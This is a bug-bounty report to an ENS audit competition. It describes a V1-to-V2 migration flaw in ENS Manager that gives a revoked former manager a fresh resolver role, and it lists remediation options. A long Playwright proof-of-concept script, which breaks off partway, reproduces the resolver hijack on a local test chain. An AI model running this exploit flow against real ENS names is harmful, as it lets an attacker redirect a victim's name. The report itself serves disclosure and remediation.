# 91824 w a medium v1 v2 migration resurrects a revoked legacy manager with fresh role set resolver after the victim reclaims the v1 node

**Submitted on Sep 4th 2026 at 15:13:07 UTC by @manvi for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91824
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

### Brief / Intro

I analysed the Manager V1→V2 migration workflow and observed that a V1 manager identity obtained from the V1 GraphQL response is treated as authorization truth for a new V2 permission grant.

For an unwrapped V1 `.eth` name, Manager derives:

```
managerAddress
```

from:

```
domain.owner.id
```

and later grants that address:

```
ROLE_SET_RESOLVER
```

on the migrated V2 name.

The critical issue is that I did not find any final-confirmation check that binds this new destination-chain permission grant to the **current** V1 `ENSRegistry.owner(node)`.

I reproduced the following sequence:

```
A = BaseRegistrar registrant / victim
C = legitimate V1 manager at preview time

1. Manager reads C and fully prepares the migration.
2. A calls canonical BaseRegistrar.reclaim(...).
3. V1 ENSRegistry.owner(node) becomes A.
4. A direct mutation attempt from C fails.
5. C therefore has no V1 manager authority.
6. The V1 source is updated to A.
7. I replay the exact V1 GraphQL request through the browser.
8. The actual served HTTP payload reports owner.id = A.
9. Only after that observation does A click the final Upgrade button.
10. Manager still grants C fresh V2 ROLE_SET_RESOLVER.
11. C uses that new role to install an attacker resolver.
12. The victim's migrated ENS name resolves to C.
```

The final hardened run therefore proves that this is not merely:

```
stale subgraph response
-> stale grant
```

The source can already be current and safe before final confirmation. The vulnerable object is the previously prepared migration security state and the missing execution-time identity revalidation.

Observed result:

```
V1 manager before preview       = C
C V2 roles before migration     = 0x0

V1 manager after reclaim        = A
C can mutate V1 after reclaim   = false
actual served V1 owner.id       = A

victim clicks final Upgrade

C V2 roles after migration      = 0x1000000
C has ROLE_SET_RESOLVER         = true

C setResolver(attackerResolver) = success
victim.eth resolves to          = C

victim V2 ERC1155 balance       = 1
```

***

## Vulnerability Details

### 1. Manager derives the security-sensitive manager identity from V1 `domain.owner.id`

I traced the V1 manager classification to:

```
packages/migration/src/service/classifyNames.ts
```

For an unwrapped `.eth` name, the code derives:

```ts
const registryOwnerAddress = toAddress(domain.owner.id)
const managerAddress =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

I observed that this value is not merely informational UI data. It becomes a security-sensitive destination-chain role recipient.

For the reproduced state:

```
BaseRegistrar registrant = A
ENS Registry owner        = C
```

classification produces:

```
managerAddress = C
```

### 2. The classified address is granted fresh V2 `ROLE_SET_RESOLVER`

I traced `managerAddress` into:

```
apps/manager/src/features/migration/service/buildRoleGrantCalls.ts
```

where Manager builds:

```ts
const ROLE_SET_RESOLVER = 1n << 24n

args: [
  resource,
  ROLE_SET_RESOLVER,
  name.managerAddress,
]
```

The permission is therefore created from the previously classified identity.

The relevant trust conversion I observed is:

```
V1 GraphQL domain.owner.id
          |
          v
     managerAddress
          |
          v
 prepared migration plan
          |
          v
grantRoles(
  resource,
  ROLE_SET_RESOLVER,
  managerAddress
)
```

### 3. The role grant is included in the migration execution batch

I traced the same identity into:

```
apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts
```

The migration adds:

```ts
if (classified.managerAddress) {
  innerExecutions.push({
    phase: 'manager-role-grant',
    name,
    names: [name],
    call: buildRoleGrantCall(classified),
  })
}
```

I therefore observed that a V1-source identity becomes a persistent V2 authorization change during the migration itself.

### 4. The migration path does not live-read V1 `ENSRegistry.owner(node)` before creating the new role

I reviewed the Manager migration contract configuration and execution path.

The V1 migration contract set includes the V1 `BaseRegistrar` and `NameWrapper`, but I did not find a migration-path live read of:

```
ENSRegistry.owner(node)
```

that validates:

```
current V1 manager == plan.classified.managerAddress
```

before `manager-role-grant` executes.

The missing check is effectively:

```
currentManager = ENSRegistry.owner(namehash(name))

if currentManager != plan.managerAddress:
    invalidate / rebuild migration plan
```

Without that binding, an identity that was authorized during preview can become unauthorized before confirmation while remaining embedded in the prepared migration state.

### 5. `assertMigrationApprovalPlanCurrent()` rechecks approval shape, not manager identity

I analysed the execution-time migration approval revalidation.

The manager-restoration condition is derived from whether any classified name has a non-null manager:

```
requiresManagerRestoration = true / false
```

The check therefore captures the **existence** of a manager-restoration requirement, but not the identity of the manager that is about to receive the role.

The vulnerable state can become:

```
prepared plan:
managerAddress = C

current V1 chain:
ENSRegistry.owner(node) = A

approval shape:
manager restoration required = true

identity comparison:
C == A ? NOT PERFORMED
```

A manager identity change can therefore preserve the same approval-key shape and pass execution-time revalidation.

### 6. The five-minute V1 cache makes the victim-remediation sequence realistic

I observed that `useV1Names` configures:

```ts
staleTime: 5 * 60 * 1000
```

This matters for a normal user sequence:

```
1. Victim opens Manager.
2. Manager reads manager C.
3. Migration preview is prepared.
4. Victim switches to another tab/tool.
5. Victim calls BaseRegistrar.reclaim() to remove C.
6. Victim returns to Manager within five minutes.
7. The V1-name query remains fresh.
8. Window focus therefore does not force that query to refetch.
9. Victim continues the migration.
```

I do not consider this a contrived "victim deliberately uses stale data" path. `BaseRegistrar.reclaim()` is the canonical unilateral remediation available to the registrant.

The application gives no indication that the reviewed manager-restoration identity has become invalid.

### 7. A plan/gas-estimate rebuild does not necessarily remove the stale identity

I also analysed the interaction with the migration plan / gas-estimate query.

Even where the plan query itself is rebuilt or refreshed, it can rebuild from the still-fresh five-minute `useV1Names` data.

The apparent safety mechanism can therefore reproduce:

```
managerAddress = C
```

from cached V1 input.

This is why I treat the bug as a security-input revalidation defect rather than merely a stale-screen rendering issue.

### 8. `BaseRegistrar.reclaim()` proves that C's V1 authority was actually removed

In the hardened PoC, victim `A` executes:

```
BaseRegistrar.reclaim(C -> A)
```

before the final Upgrade click.

I then directly read:

```
ENSRegistry.owner(node)
```

and observed:

```
A
```

I also attempted a V1 `setOwner()` mutation from `C`.

Observed result:

```
C can mutate V1 after reclaim = false
```

The finding therefore does not infer revocation from UI state. I directly proved that the former manager was no longer authorized on V1 before the victim confirmed migration.

### 9. The hardened PoC proves the external V1 source itself served A before the final click

I specifically hardened the PoC to remove the strongest possible "malicious/stale indexer" rebuttal.

During migration planning I capture the exact V1 GraphQL request bodies used by Manager.

After `reclaim()` I update the test's V1 source to the current chain state and replay the captured request through the browser. Because the replay goes through the browser, the existing Playwright `page.route()` V1 interception serves the response.

I then inspect the **actual returned HTTP JSON** and locate the target name's:

```
owner.id
```

Observed before final Upgrade:

```
[M1] OBSERVED actual V1 HTTP response owner.id AFTER reclaim =
0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
```

which is victim `A`.

The PoC asserts:

```
actual served owner.id == victim A
```

and logs:

```
[M1] ✅ actual served V1 payload reports A BEFORE final Upgrade click
```

Only after this assertion succeeds does the victim click the final Upgrade button.

This establishes:

```
current V1 chain manager = A
actual served V1 source  = A

but prepared migration role recipient = C
```

### 10. Post-migration verification is circular because it verifies the same stale identity used to build the grant

I observed that `buildAtomicMigrationBatches.ts` also builds the `manager-role` verification expectation from:

```
classified.managerAddress
```

The same stale value therefore participates in both:

```
1. the role grant
2. the expected post-state
```

The effective check is:

```
Did V2 grant ROLE_SET_RESOLVER to C,
where C is the address the prepared plan already expected?
```

rather than:

```
Was C still the current V1 manager when A confirmed migration?
```

The verification relationship is therefore:

```
stale classified manager C
        |
        +--> build grant to C
        |
        +--> expect role on C
                 |
                 v
          verifier sees role
                 |
                 v
          migration verified
```

I observed Manager report migration completion after the unauthorized role was created.

The verifier proves that execution matched the prepared plan. It does not prove that the plan's security-sensitive identity remained authorized.

### 11. The migration creates fresh authority; this is not persistence of a pre-existing V2 role

Before migration I directly read:

```
C V2 roles = 0x0
```

After the victim's remediation and migration I directly read:

```
C V2 roles = 0x1000000
```

and asserted:

```
C has fresh V2 ROLE_SET_RESOLVER = true
```

The transition is therefore:

```
0x0
  |
  | Manager migration
  v
0x1000000
```

The migration **creates** the authority.

### 12. C immediately converts the fresh role into resolver hijack

After observing the unauthorized role grant, I deployed an attacker-controlled resolver from `C` using a normal EVM contract-creation transaction.

Observed deployment:

```
status = success
attacker resolver =
0xd98394c99151e9f7479447a52b6c4ecc521eb467
```

I then had `C` execute:

```
ETHRegistry.setResolver(resource, attackerResolver)
```

Observed:

```
status = success
```

The victim's migrated name then resolved to:

```
0x70997970C51812dc3A010C7d01b50e0d17dc79C8
```

which is `C`.

### 13. The victim remains the legitimate V2 owner

I separately read V2 ERC-1155 ownership.

After migration:

```
victim V2 ERC1155 balance = 1
```

After the resolver hijack:

```
victim V2 ERC1155 balance = 1
```

I therefore observed an unauthorized resolver-control grant while ownership remained with the victim.

This isolates the demonstrated impact to the migration-created permission and resolver hijack rather than an ownership-transfer artifact.

***

## Why this is not merely a UI/UX issue

The migration UI is relevant because it is the user-facing flow through which the victim authorizes migration, but the demonstrated impact is persistent on-chain authorization and resolver state.

I directly observed:

```
before migration:
C V2 roles = 0x0

after migration:
C V2 roles = 0x1000000

attacker action:
C -> ETHRegistry.setResolver(...)

transaction:
success

final resolution:
victim.eth -> C
```

The V2 role bitmap and resolver address are read directly from chain state.

The issue therefore persists independently of any subsequent frontend rendering or indexer synchronization.

***

## Why this is not intended design

Manager restoration itself can be a legitimate migration feature. The issue is **which address** is restored.

I reproduced a state where:

```
C was legitimate at preview time
C was revoked before final confirmation
V1 chain says current manager = A
actual V1 HTTP source says current manager = A
```

yet migration still recreates `C`'s authority.

I do not see a reasonable design interpretation under which "restore the existing manager" means "restore an address that is no longer the manager when the user confirms."

The intended security property should be:

```
restore current authorized V1 manager
```

not:

```
restore whichever manager happened to be present
when an earlier migration snapshot was prepared
```

The user receives no warning that `reclaim()` has been silently invalidated by the prepared migration state.

***

## Why this does not require a trusted or privileged actor

The exploit path does not require:

* ENS governance access;
* application administrator access;
* privileged backend credentials;
* control of the V1 subgraph;
* a malicious indexer;
* a compromised RPC;
* a privileged V2 registry role before migration;
* a compromised victim key;
* a malicious browser extension.

At final confirmation I verified:

```
C V1 authority = none
C V2 roles     = 0x0
```

The only reason `C` can later change the resolver is that the victim's normal Manager migration creates the fresh V2 role.

The local PoC fixture uses Anvil-only historical setup to create a migratable V1 name because old V1 registration controllers are no longer active after the V2 cutover. Those fixture operations are test-environment setup only and are not part of the exploit or attacker capability.

***

## Why reclaim + continuing migration is a realistic supported workflow

I do not consider the victim's `reclaim()` action an artificial prerequisite.

`BaseRegistrar.reclaim()` is the canonical unilateral mechanism by which the `.eth` registrant can restore ENS Registry ownership of the node.

A realistic user flow is:

```
Victim begins Manager migration
-> sees / discovers old manager C
-> uses canonical reclaim() remediation
-> reclaim succeeds
-> returns to the still-open Manager migration
-> Manager gives no stale-security-state warning
-> victim continues
```

The five-minute V1 cache makes returning to the still-open migration within that interval practical.

I also observed that the user does not need to manipulate React state, localStorage, browser developer tools, the QueryClient, or migration internals.

The application silently invalidates the security effect of the user's own remediation.

***

## Why this is not a third-party V1 subgraph / indexer issue

The hardened PoC directly addresses this boundary.

I did **not** leave the V1 source reporting `C` after `reclaim()`.

Instead:

```
after reclaim:
chain manager = A
mock source   = A
```

I then replayed the exact GraphQL request through the browser and inspected the actual response.

Observed:

```
actual HTTP owner.id = A
```

before:

```
victim clicks final Upgrade button
```

The migration still granted `C` fresh `ROLE_SET_RESOLVER`.

The final exploit therefore does not depend on:

```
malicious indexer
stale indexer
compromised subgraph
incorrect GraphQL response
```

The source can already be correct. The in-scope Manager application fails to rebind the prepared security-sensitive role grant to current authorization.

***

## Why this is not a transfer-time existing-role persistence issue

I also distinguished this finding from cases where a V2 delegated role already exists and survives an ownership transfer.

This PoC begins with:

```
C V2 roles BEFORE migration = 0x0
```

and ends with:

```
C V2 roles AFTER migration = 0x1000000
```

The vulnerable migration creates a new permission. It is not preserving a V2 permission that `C` already had.

***

## Why this is not one of the disclosed known issues

I reviewed the disclosed ENS Audit Competition known-issue material against this root cause.

The known transfer/role-combination issue describes later profile or primary-name errors arising from certain role combinations.

This finding is different:

```
known functional breakage:
role combination
-> later operation errors

this finding:
V1 manager revoked before final confirmation
-> migration creates fresh V2 ROLE_SET_RESOLVER
-> former manager successfully installs attacker resolver
-> victim name resolves to former manager
```

The known-issue guidance also distinguishes a demonstrated security consequence where a role combination grants authority that it should not grant from merely functional breakage.

I also compared this finding against the known parent-transfer / registry-detachment behavior. That issue concerns transfer-time state and follow-up subname/primary-name behavior. This report concerns a V1→V2 migration security input that becomes stale after canonical V1 remediation and is then used to create fresh V2 authority.

The root invariant here is:

> **An address that is no longer authorized as the V1 ENS Registry manager when the registrant confirms migration must not receive fresh V2 permissions from that migration.**

I did not identify a disclosed known issue covering that root cause and demonstrated resolver-hijack consequence.

***

## Audited Revision Verification

The ENS Audit Competition scope corresponds to upstream ENS revision:

```
63772fd872af472ced58b009499355f3430c2a86
```

The frozen Immunefi competition import used for the PoC is:

```
cda79acaad59711b943fc68207ebb3f1d0ff8596
```

The import corresponds to the upstream audited revision.

My analysis checkout used:

```
/workspaces/audit-comp-ens
branch: audit/ens-security-63772
```

The isolated PoC worktree used:

```
/workspaces/ens-wrapper-retention-poc
branch: poc/wrapper-root-retention
```

The branch name is historical from an earlier candidate; the final PoC in that worktree is the stale-manager migration PoC described in this report.

The PoC worktree was based on the frozen competition import. I did not modify the vulnerable production Manager migration logic to make the exploit succeed.

The local changes used for reproduction were limited to E2E/test infrastructure necessary to:

* create a historical migratable V1 name on the local Sepolia/Anvil environment;
* model a V1 registrant and V1 registry manager as different addresses;
* intercept the remote V1 GraphQL endpoint for locally-created state;
* capture and inspect the actual served V1 HTTP payload;
* execute the browser-to-chain exploit; and
* isolate the test in a one-test Playwright configuration.

Final runtime environment:

```
Node:  v22.22.1
pnpm:  10.27.0
chain: 11155111 (Sepolia)
```

Relevant canonical/local-fork addresses observed in the final environment:

```
V1 ENS Registry:
0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e

V1 BaseRegistrar:
0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85

V2 ETHRegistry:
0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2

V2 ETHRegistrar:
0xa88553F454b77203B0D036A05c894d555EAAa2Cc
```

The final hardened browser E2E run completed with:

```
1 passed (1.1m)
```

***

## Impact Details

I reproduced a complete unauthorized resolver-control transition.

Final successful run:

```
name:
m1-stale-manager-final-1788325410.eth

victim A:
0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

former manager C:
0x70997970C51812dc3A010C7d01b50e0d17dc79C8
```

Before migration:

```
V1 manager:
C

C V2 role bitmap:
0x0
```

Victim remediation:

```
BaseRegistrar.reclaim(C -> A):
success

V1 manager after reclaim:
A

C can mutate V1:
false
```

Source-state proof before final Upgrade:

```
actual served V1 HTTP owner.id:
0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
```

which is `A`.

After Manager migration:

```
victim V2 ERC1155 balance:
1

C V2 role bitmap:
0x1000000

C has ROLE_SET_RESOLVER:
true

A has ROLE_SET_RESOLVER_ADMIN:
true
```

Attacker resolver:

```
0xd98394c99151e9f7479447a52b6c4ecc521eb467
```

Attacker actions:

```
deploy resolver:
success

C replaces victim resolver:
success
```

Final resolution:

```
m1-stale-manager-final-1788325410.eth
->
0x70997970C51812dc3A010C7d01b50e0d17dc79C8
```

which is `C`.

Victim ownership after resolver hijack:

```
V2 ERC1155 balance = 1
```

The demonstrated impact is therefore not theoretical permission drift. I observed a former manager with no V1 authority and no prior V2 role receive fresh resolver authority from migration and immediately use it to make the victim's migrated ENS name resolve to the former manager.

Relevant transaction hashes from the final run:

```
A assigns C as V1 manager:
0x4f15005b05637149eeb14bbbea2a637aad4c5593f4be763d7bbac35e7c7db088

A executes BaseRegistrar.reclaim(C -> A):
0x6899750bc1468f226ecff231d842429feb3fc084a6b5e4d21c4debe827f8a410

C deploys attacker resolver:
0xbc926259f20e7c514a769a59d437843171320bd44ff4d5bdcd107ac7d12ace43

C replaces victim V2 resolver:
0x376e41a48158c0aa0574e903dff98a596073594f73e0a9c6e3b6aab3a89ba915
```

I conservatively do not claim permanent control because `A` receives the corresponding resolver admin role and can revoke `C` after discovering the migration-created permission.

***

## Preconditions

1. The victim is the legitimate BaseRegistrar registrant of a V1 unwrapped `.eth` name.
2. At the time Manager initially prepares the migration, the V1 ENS Registry manager is a different address `C`.
3. Manager consumes that legitimate initial state and prepares the migration with `managerAddress = C`.
4. Before final migration confirmation, the victim uses `BaseRegistrar.reclaim()` to restore the V1 node to themselves.
5. The victim continues the already-open Manager migration flow.
6. The migration executes before the prepared/cached manager identity is securely rebound to current V1 authorization.

No ENS governance access, application administrator access, compromised indexer, malicious RPC, privileged V2 role, compromised victim key, same-block ordering, unusual token behavior, or malicious external contract is required.

At final confirmation the PoC explicitly proves:

```
C V1 authority = none
C V2 roles     = 0x0
actual served V1 owner.id = A
```

***

## Recommended Remediation

The destination-chain role grant should be bound to the current authoritative V1 manager at execution time.

### Option 1 — live-read `ENSRegistry.owner(node)` immediately before the irreversible role grant

Before executing the migration batch, resolve:

```
currentManager = ENSRegistry.owner(namehash(name))
```

Then require:

```
currentManager == plan.managerAddress
```

If not:

```
invalidate plan
refetch source state
rebuild migration
require fresh user review
```

This is the strongest fix because the security-sensitive identity is checked against canonical chain state at the point where it is converted into a V2 permission.

### Option 2 — bind manager identity into migration-plan freshness / approval validation

Do not reduce manager restoration to:

```
requiresManagerRestoration = true
```

Bind the actual address:

```
managerAddress = C
```

into the migration security-state fingerprint.

Any change from:

```
C -> A
```

must invalidate the old plan even if the high-level set of approval transactions remains the same.

### Option 3 — derive `manager-role-grant` from freshly validated authority, not stale `classified`

The role-grant builder should consume a manager identity that has been freshly validated immediately before execution.

It should not use an identity solely because it exists in an older `ClassifiedName`.

### Option 4 — make post-migration verification non-circular

The verifier should not merely ask whether the stale plan's recipient received the stale plan's role.

It should verify:

```
recipient granted in V2
==
manager authorized by current V1 source-of-truth
```

If the V1 manager changed before confirmation, verification should fail closed or the migration should be rebuilt.

### Option 5 — add regression tests for authority changes between preview and confirmation

At minimum, add:

```
preview manager = C
reclaim C -> A
final confirmation
expected: C receives no V2 role
```

and:

```
preview manager = C
source refetch returns A
plan rebuild/confirmation
expected: stale C cannot survive
```

Also test the post-state verifier so that a role grant matching a stale plan cannot be treated as sufficient proof of authorization.

### Recommended invariant

> **An address that is no longer authorized as the V1 ENS Registry manager when the registrant confirms migration must never receive fresh V2 permissions from that migration.**

***

## References

### In-scope Manager

* `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts`
  * defines `ROLE_SET_RESOLVER`
  * builds the role grant to `name.managerAddress`
* `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts`
  * emits the `manager-role-grant` execution
  * builds the `manager-role` verification expectation
* `apps/manager/src/features/migration/service/migrationService.ts`
  * migration planning
  * approval/current-plan validation
  * execution/retry flow
* `apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts`
  * verifies the prepared manager-role expectation
* `apps/manager/src/features/migration/hooks/useV1Names.ts`
  * V1 names query
  * five-minute stale time
* `apps/manager/src/features/migration/contracts/addresses.ts`
  * migration contract configuration
  * no V1 ENS Registry authority read in the migration contract set

### Supporting classification code consumed by Manager

* `packages/migration/src/service/classifyNames.ts`
  * derives `managerAddress` from V1 `domain.owner.id`

### Relevant authorization primitives

* V1 `ENSRegistry.owner(node)`
* V1 `ENSRegistry.setOwner(node, owner)`
* V1 `BaseRegistrar.reclaim(labelhash, owner)`
* V2 `ETHRegistry.roles(resource, account)`
* V2 `ETHRegistry.setResolver(resource, resolver)`
* V2 ERC-1155 `balanceOf(account, tokenId)`

### Final PoC evidence files

* `e2e/projects/manager/tests/stale-manager-role-grant.poc.spec.ts`
* `e2e/projects/manager/playwright.stale-manager-poc.config.ts`
* `e2e/helpers/mock-v1-subgraph.ts`

***

## Proof of Concept

## PoC Classification

I implemented a repo-native **browser-to-chain Manager E2E PoC** against the frozen ENS competition code.

The final PoC uses the real:

* Manager application;
* Manager migration planning and execution flow;
* Playwright browser;
* headless wallet authorization flow;
* canonical V1 ENS Registry;
* canonical V1 BaseRegistrar;
* real `BaseRegistrar.reclaim()`;
* real V2 ETHRegistry;
* direct V2 role-bitmap reads;
* direct V2 ERC-1155 ownership reads;
* real attacker contract-creation transaction;
* real `ETHRegistry.setResolver()` transaction; and
* direct resolver invocation proving the victim name resolves to `C`.

I mock only the V1 GraphQL route because a name created on the local Anvil/Sepolia environment cannot exist in the remote production indexer.

The hardened version additionally:

1. captures the exact V1 GraphQL request bodies Manager used while preparing migration;
2. updates the mocked source to the current post-`reclaim()` state;
3. replays the exact request through the browser;
4. inspects the actual returned HTTP JSON;
5. asserts `owner.id == A`;
6. performs that assertion **before** the victim clicks final Upgrade; and
7. then proves the prepared migration nevertheless grants `C` fresh V2 authority.

The mock is therefore truth-preserving:

```
initial:
chain manager = C
served owner  = C

after reclaim:
chain manager = A
served owner  = A
```

The final exploit does not require a malicious or permanently stale indexer.

The local historical V1 fixture temporarily creates registration conditions that are no longer naturally available after the V2 cutover. Those local fixture operations are only test setup and do not participate in the security-sensitive exploit transition.

## PoC File

Primary PoC:

```
e2e/projects/manager/tests/stale-manager-role-grant.poc.spec.ts
```

Supporting files:

```
e2e/helpers/mock-v1-subgraph.ts
e2e/projects/manager/playwright.stale-manager-poc.config.ts
```

## Complete Hardened E2E PoC

The source below is the complete hardened browser-to-chain PoC. STEP 6 replays the captured `getNamesForAddress` request from inside the Playwright browser, inspects the actual returned HTTP JSON, extracts `owner.id`, and asserts that it is victim `A` **before** the final Upgrade click.

```ts
/**
 * E2E PoC — revoked V1 manager is resurrected with fresh V2 ROLE_SET_RESOLVER
 *
 * Security invariant:
 *
 *   If C is no longer the current V1 ENS Registry manager when A confirms
 *   migration, migration must not grant C fresh V2 permissions.
 *
 * Actors:
 *   A = BaseRegistrar registrant / victim
 *   C = former V1 ENS Registry manager
 *
 * Flow:
 *   1. Create an actual unwrapped V1 .eth name owned by A.
 *   2. A legitimately makes C the V1 ENS Registry manager.
 *   3. Manager UI reads truthful source state and prepares migration with C.
 *   4. Before final Upgrade confirmation, A calls BaseRegistrar.reclaim(),
 *      restoring V1 ENS Registry ownership to A.
 *   5. Prove C can no longer mutate the V1 node.
 *   6. Update the mocked external V1 indexer to the now-current safe state A.
 *   7. A confirms the already-prepared migration through the real Manager UI.
 *   8. Read V2 ETHRegistry and prove C received fresh ROLE_SET_RESOLVER.
 *   9. C deploys an attacker-controlled resolver with a real transaction.
 *  10. C exercises the resurrected role via ETHRegistry.setResolver().
 *  11. Prove the victim's migrated name now resolves to C.
 *
 * The V1 subgraph is mocked only because locally-created Anvil state cannot
 * appear in the remote production V1 indexer. The mock initially mirrors
 * actual chain state C and is changed to actual chain state A after reclaim().
 * No malicious or permanently stale subgraph is required.
 */

import type {
  Locator,
  Page,
} from '@playwright/test'

import type {
  Web3ProviderBackend,
} from '@ensdomains/headless-web3-provider'

import {
  ensL1Contracts,
  supportedL1Chains,
} from '@ensdomains/ensjs/chain'

import {
  getTokenId,
} from '@ensdomains/ensjs/public/v2'

import {
  labelToCanonicalId,
} from '@ensdomains/ensjs/utils/v2'

import {
  type Address,
  type Hex,
  encodeFunctionData,
  erc1155Abi,
  keccak256,
  namehash,
  parseAbi,
  toHex,
} from 'viem'

import {
  privateKeyToAccount,
} from 'viem/accounts'

import {
  createMakeV1Name,
  V1_BASE_REGISTRAR,
  V1_ENS_REGISTRY,
} from '../../../fixtures/makeV1Name.js'

import {
  authorizeTransactionsWhile,
  expect,
  test,
} from '../../../fixtures/playwright.manager.fixture.js'

import {
  publicClient,
  testClient,
  walletClient,
} from '../../../helpers/anvil-client.js'

import {
  type MockV1Name,
  mockV1Subgraph,
} from '../../../helpers/mock-v1-subgraph.js'

const MANAGER_APP_URL =
  process.env.MANAGER_APP_URL ??
  'http://localhost:3000'

const V1_SUBGRAPH_HTTP_URL =
  'https://v1-graphql.ens.dev/subgraph'

/**
 * Recursively locate the actual `owner.id` returned for targetName
 * in a V1 GraphQL HTTP response.
 */
function findServedV1OwnerId(
  value: unknown,
  targetName: string,
): string | null {
  if (Array.isArray(value)) {
    for (const entry of value) {
      const found =
        findServedV1OwnerId(
          entry,
          targetName,
        )

      if (found) return found
    }

    return null
  }

  if (
    value === null ||
    typeof value !== 'object'
  ) {
    return null
  }

  const object =
    value as Record<
      string,
      unknown
    >

  const owner =
    object.owner

  if (
    typeof object.name === 'string' &&
    object.name.toLowerCase() ===
      targetName.toLowerCase() &&
    owner !== null &&
    typeof owner === 'object'
  ) {
    const id =
      (
        owner as Record<
          string,
          unknown
        >
      ).id

    if (typeof id === 'string') {
      return id
    }
  }

  for (
    const child
    of Object.values(object)
  ) {
    const found =
      findServedV1OwnerId(
        child,
        targetName,
      )

    if (found) return found
  }

  return null
}

const V2_ETH_REGISTRY =
  ensL1Contracts[
    supportedL1Chains.sepolia
  ].ensRegistry.address as Address

const ROLE_SET_RESOLVER =
  1n << 24n

const ROLE_SET_RESOLVER_ADMIN =
  ROLE_SET_RESOLVER << 128n

const V1_ENS_REGISTRY_ABI = parseAbi([
  'function owner(bytes32 node) view returns (address)',
  'function setOwner(bytes32 node,address owner)',
])

const V1_BASE_REGISTRAR_ABI = parseAbi([
  'function reclaim(uint256 id,address owner)',
])

const V2_ETH_REGISTRY_ABI = parseAbi([
  'function roles(uint256 anyId,address account) view returns (uint256)',
  'function setResolver(uint256 anyId,address resolver)',
  'function getResolver(string label) view returns (address)',
])

const ATTACKER_RESOLVER_ABI = parseAbi([
  'function addr(bytes32 node) view returns (address)',
])

async function sendAndWait(params: {
  readonly account: ReturnType<
    typeof privateKeyToAccount
  >
  readonly to: Address
  readonly data: Hex
  readonly what: string
}) {
  const hash =
    await walletClient.sendTransaction({
      account: params.account,
      to: params.to,
      data: params.data,
    })

  const receipt =
    await publicClient
      .waitForTransactionReceipt({
        hash,
      })

  console.log(
    `[M1 tx] ${params.what}: ` +
      `${hash} status=${receipt.status}`,
  )

  expect(receipt.status).toBe('success')

  return {
    hash,
    receipt,
  }
}

async function prepareMigrationPlan(
  page: Page,
): Promise<Locator> {
  await page.goto(
    `${MANAGER_APP_URL}/dashboard`,
  )

  await page.waitForLoadState(
    'networkidle',
  )

  const dashboardUpgrade =
    page
      .getByRole('button', {
        name: 'Upgrade Names',
      })
      .first()

  await dashboardUpgrade.waitFor({
    state: 'visible',
    timeout: 30_000,
  })

  await dashboardUpgrade.click()

  await expect(
    page.getByText(
      'Your names are ready to upgrade',
    ),
  ).toBeVisible({
    timeout: 60_000,
  })

  await expect(
    page.getByText(
      /Estimated network fee:/i,
    ),
  ).toBeVisible({
    timeout: 120_000,
  })

  const finalUpgrade =
    page.getByRole('button', {
      name: /^Upgrade \d+ names?$/i,
    })

  await expect(
    finalUpgrade,
  ).toBeEnabled({
    timeout: 120_000,
  })

  console.log(
    '[M1] ✅ migration preview fully prepared',
  )

  return finalUpgrade
}

async function executePreparedMigration(
  page: Page,
  wallet: Web3ProviderBackend,
  finalUpgrade: Locator,
): Promise<void> {
  let migrationFinished = false

  const authorizationLoop =
    authorizeTransactionsWhile(
      page,
      wallet,
      () => migrationFinished,
    )

  try {
    console.log(
      '[M1] victim clicks final Upgrade button',
    )

    await finalUpgrade.click()

    await page
      .getByRole('dialog', {
        name:
          'Your name has been upgraded!',
      })
      .waitFor({
        state: 'visible',
        timeout: 180_000,
      })

    migrationFinished = true
    await authorizationLoop

    console.log(
      '[M1] ✅ Manager reports migration completed',
    )
  } finally {
    migrationFinished = true
    await authorizationLoop.catch(
      () => {},
    )
  }
}

test.describe(
  'M1 E2E — stale V1 manager resurrection',
  () => {
    test.describe.configure({
      timeout: 360_000,
    })

    test(
      'revoked V1 manager receives fresh V2 ROLE_SET_RESOLVER and hijacks resolution',
      async ({
        migrationConnectedPage: page,
        wallet,
        accounts,
      }) => {
        const victim =
          privateKeyToAccount(
            accounts.getPrivateKey(
              'user',
            ),
          )

        const formerManager =
          privateKeyToAccount(
            accounts.getPrivateKey(
              'user2',
            ),
          )

        await testClient.setBalance({
          address: victim.address,
          value: 100n * 10n ** 18n,
        })

        await testClient.setBalance({
          address:
            formerManager.address,
          value: 100n * 10n ** 18n,
        })

        console.log('')
        console.log(
          '============================================================',
        )
        console.log(
          'M1 E2E: stale V1 manager resurrection',
        )
        console.log(
          '============================================================',
        )

        console.log(
          '[M1] V2 ETHRegistry =',
          V2_ETH_REGISTRY,
        )

        console.log(
          '[M1] victim A       =',
          victim.address,
        )

        console.log(
          '[M1] former manager C =',
          formerManager.address,
        )

        // ----------------------------------------------------------
        // STEP 1 — create actual historical V1 state.
        // ----------------------------------------------------------

        const makeV1Name =
          createMakeV1Name({
            userAccount: victim,
          })

        const v1Name =
          await makeV1Name({
            label:
              'm1-stale-manager-final',
            type: 'unwrapped',
          })

        const label =
          v1Name.replace(
            /\.eth$/i,
            '',
          )

        const node =
          namehash(v1Name)

        // V1 BaseRegistrar ERC721 labelhash token id.
        const v1TokenId =
          BigInt(
            keccak256(
              toHex(label),
            ),
          )

        const resource =
          labelToCanonicalId(label)

        console.log(
          '[M1] name =',
          v1Name,
        )

        console.log(
          '[M1] resource =',
          resource.toString(),
        )

        // ----------------------------------------------------------
        // STEP 2 — truthful initial V1 state:
        // registrant A, ENS Registry manager C.
        // ----------------------------------------------------------

        await sendAndWait({
          account: victim,
          to: V1_ENS_REGISTRY,
          what:
            'A assigns C as V1 ENS Registry manager',
